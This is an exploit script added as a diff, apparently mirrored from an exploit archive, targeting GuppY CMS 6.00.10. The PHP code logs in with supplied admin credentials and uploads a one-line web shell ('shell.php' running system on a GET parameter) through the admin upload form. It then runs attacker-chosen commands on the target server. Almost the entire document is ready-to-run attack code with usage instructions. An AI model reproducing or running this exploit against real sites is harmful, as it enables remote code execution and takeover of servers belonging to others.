@@ -1,0 +1,131 @@
+id: 38006
+date: 10/03/2022
+title: GuppY CMS 6.00.10 Shell Upload Exploit
+author: Chokri Hammedi
+cves: 
+
+# Exploit Title: GuppY 6.00.10 CMS Remote Code Execution
+# Exploit Author: Chokri Hammedi
+# Vendor Homepage: https://www.freeguppy.org/
+# Software Link:
+https://www.freeguppy.org/fgy6dn.php?lng=en&pg=279927&tconfig=0#z2
+# Version: 6.00.10
+# Tested on: Linux
+
+#!/usr/bin/php
+
+<?php
+
+$username = "Admin"; //Administrator username
+$password = "rose1337"; //Administrator password
+
+
+$options = getopt('u:c:');
+
+if(!isset($options['u'], $options['c']))
+die("\n GuppY 6.00.10 CMS Remote Code Execution \n Author: Chokri Hammedi
+\n \n Usage : php exploit.php -u http://target.org/ -c whoami\n\n
+
+\n");
+
+$target     =  $options['u'];
+
+$command    =  $options['c'];
+
+// Administrator login
+
+$cookie="cookie.txt";
+$url = "{$target}guppy/connect.php";
+
+$postdata = "connect=on&uuser=old&pseudo=".$username."&uid=".$password;
+$curlObj = curl_init();
+
+curl_setopt($curlObj, CURLOPT_URL, $url);
+curl_setopt($curlObj, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curlObj, CURLOPT_HEADER, 1);
+curl_setopt($curlObj, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt ($curlObj, CURLOPT_POSTFIELDS, $postdata);
+curl_setopt ($curlObj, CURLOPT_POST, 1);
+CURL_setopt($curlObj,CURLOPT_RETURNTRANSFER,True);
+CURL_setopt($curlObj,CURLOPT_FOLLOWLOCATION,True);
+CURL_SETOPT($curlObj,CURLOPT_CONNECTTIMEOUT,30);
+CURL_SETOPT($curlObj,CURLOPT_TIMEOUT,30);
+curl_setopt($curlObj,CURLOPT_COOKIEFILE, "$cookie");
+curl_setopt($curlObj, CURLOPT_COOKIEJAR, "$cookie");
+$result = curl_exec($curlObj);
+
+
+// uploading shell
+
+$url2 = "{$target}guppy/admin/admin.php?lng=en&pg=upload";
+
+$post='------WebKitFormBoundarygA1APFcUlkIaWal4
+Content-Disposition: form-data; name="rep"
+
+file
+------WebKitFormBoundarygA1APFcUlkIaWal4
+Content-Disposition: form-data; name="ficup"; filename="shell.php"
+Content-Type: application/x-php
+
+<?php system($_GET["cmd"]); ?>
+
+------WebKitFormBoundarygA1APFcUlkIaWal4--
+';
+
+$headers = array(
+
+
+            'Content-Type: multipart/form-data;
+boundary=----WebKitFormBoundarygA1APFcUlkIaWal4',
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
+
+            'Accept-Encoding: gzip, deflate',
+            'Accept-Language: en-US,en;q=0.9'
+);
+curl_setopt($curlObj, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($curlObj, CURLOPT_URL, $url2);
+curl_setopt($curlObj, CURLOPT_POSTFIELDS, $post);
+curl_setopt($curlObj, CURLOPT_POST, true);
+curl_setopt($curlObj, CURLOPT_SSL_VERIFYPEER, false);
+CURL_setopt($curlObj,CURLOPT_RETURNTRANSFER,True);
+CURL_setopt($curlObj,CURLOPT_FOLLOWLOCATION,True);
+CURL_SETOPT($curlObj,CURLOPT_CONNECTTIMEOUT,30);
+CURL_SETOPT($curlObj,CURLOPT_TIMEOUT,30);
+curl_setopt($curlObj,CURLOPT_COOKIEFILE, "$cookie");
+curl_setopt($curlObj, CURLOPT_COOKIEJAR, "$cookie");
+
+$data = curl_exec($curlObj);
+
+
+// Executing the shell
+
+
+$shell = "{$target}guppy/file/shell.php?cmd=" .$command;
+curl_setopt($curlObj, CURLOPT_URL, $shell);
+curl_setopt($curlObj, CURLOPT_HTTPHEADER, array('Content-Type:
+application/x-www-form-urlencoded'));
+curl_setopt($curlObj, CURLOPT_SSL_VERIFYPEER, False);
+CURL_setopt($curlObj,CURLOPT_RETURNTRANSFER,True);
+curl_setopt($curlObj, CURLOPT_HEADER, False);
+curl_setopt($curlObj, CURLOPT_POST, false);
+
+$exec_shell = curl_exec($curlObj);
+
+$code = curl_getinfo($curlObj, CURLINFO_HTTP_CODE);
+
+if($code != 200) {
+    echo "\n\n \e[5m\033[31m[-]Something went wrong! \n [-]Please check the
+credentials\n";
+}
+else {
+
+print("\n");
+print($exec_shell);
+
+}
+curl_close($curlObj);
+
+?>
+
+#  0day.today [2023-03-24]  #
